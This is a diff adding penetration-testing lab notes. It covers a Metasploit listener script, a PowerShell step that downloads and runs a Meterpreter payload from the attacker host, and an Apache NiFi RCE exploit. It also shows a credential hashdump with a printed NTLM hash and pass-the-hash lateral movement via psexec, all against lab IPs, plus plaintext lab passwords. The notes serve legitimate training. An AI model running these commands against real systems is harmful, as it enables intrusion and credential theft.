@@ -3663,6 +3663,79 @@ Reference
     `meterpreter > portfwd add -l 3389 -p 3389 -r 172.16.186.200`
   - RDP  
     `xfreerdp3 /u:luiza /p:BoccieDearAeroMeow1! /v:127.0.0.1 /cert:ignore /drive:share,/home/kali/share`
+- **use a resource script to set up a multi/handler**
+  - create listener.rc
+    ```
+    use exploit/multi/handler
+    set PAYLOAD windows/meterpreter_reverse_https
+    set LHOST 192.168.45.179
+    set LPORT 443
+    set AutoRunScript post/windows/manage/migrate 
+    set ExitOnSession false
+    run -z -j
+    ```
+  - execute msfconsole module  
+    `kali@kali:~$ sudo msfconsole -r listener.rc`
+  - trigger the payload
+    ```
+    xfreerdp3 /u:justin /p:SuperS3cure1337# /v:192.168.231.202 /cert:ignore /drive:share,/home/kali/share
+    PS C:\Users\justin> iwr -uri http://192.168.45.179/met.exe -Outfile met.exe
+    PS C:\Users\justin> .\met.exe
+    ```
+- capstone (apache_nifi and SMB psexec)  
+  - Enumeration  
+    VM1: `nmap -sV 192.168.231.225`: port 135, 139, 445, 8080 (http-Jetty 9.4.48)  
+    VM2: `nmap -sV 192.168.231.226`: port 135, 139, 445  
+    `whatweb http://192.168.231.225:8080` > Title[NiFi]
+  - search exploit module in msfconsole  
+    ```
+    msf6 > search Jetty
+    msf6 > search nifi
+
+    msf6 > search type:auxiliary smb
+    msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.231.225
+    msf6 auxiliary(scanner/smb/smb_version) > run
+    msf6 auxiliary(scanner/smb/smb_version) > vulns
+    ...
+    SMB Sign in is not required
+    ```
+  - Execute exploit  
+    ```
+    msf6 >  use multi/http/apache_nifi_processor_rce
+    msf6 exploit(multi/http/apache_nifi_processor_rce) > show advanced
+    msf6 exploit(multi/http/apache_nifi_processor_rce) > set RHOSTS 192.168.231.225
+    msf6 exploit(multi/http/apache_nifi_processor_rce) > set LHOST 192.168.45.179
+    msf6 exploit(multi/http/apache_nifi_processor_rce) > set TARGET 1
+    msf6 exploit(multi/http/apache_nifi_processor_rce) > set payload cmd/windows/powershell/x64/meterpreter/reverse_tcp
+    msf6 exploit(multi/http/apache_nifi_processor_rce) > set SSL false
+    msf6 exploit(multi/http/apache_nifi_processor_rce) > set ForceExploit true
+    msf6 exploit(multi/http/apache_nifi_processor_rce) > run
+    ```
+  - Enumerate target OS/User info after meterpreter session (VM1)  
+    ```
+    meterpreter > sysinfo
+    meterpreter > getuid  //ITWK03\alex
+    meterpreter > getprivs //SeImpersonatePrivilege
+    meterpreter > getsystem
+    meterpreter > shell
+    C:\nifi-1.17.0> net user  //Administrator, itwk04admin
+    ```
+  - Dump credentials  
+    `meterpreter > hashdump` //itwk04admin:1003:aad3b435b51404eeaad3b435b51404ee:**445414c16b5689513d4ad8234391aacf**:::
+  - pass the hash (SMB accept NTLM hash as credential) to connect to VM2  
+    ```
+    msf6 exploit(windows/smb/psexec) > set SMBUser itwk04admin
+    msf6 exploit(windows/smb/psexec) > set SMBPass 00000000000000000000000000000000:445414c16b5689513d4ad8234391aacf
+    msf6 exploit(windows/smb/psexec) > set RHOSTS 192.168.231.226
+    msf6 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/bind_tcp
+    msf6 exploit(windows/smb/psexec) > set LPORT 8000
+    msf6 exploit(windows/smb/psexec) > run
+
+    OR
+    impacket-psexec -hashes 00000000000000000000000000000000:445414c16b5689513d4ad8234391aacf itwk04admin@192.168.159.22
+    ```
+  - Capture the flag  
+    `meterpreter > shell` `C:\Windows\system32>type C:\Users\itwk04admin\Desktop\flag.txt`  
 
 ## Penetration testing report 
 - note editor:
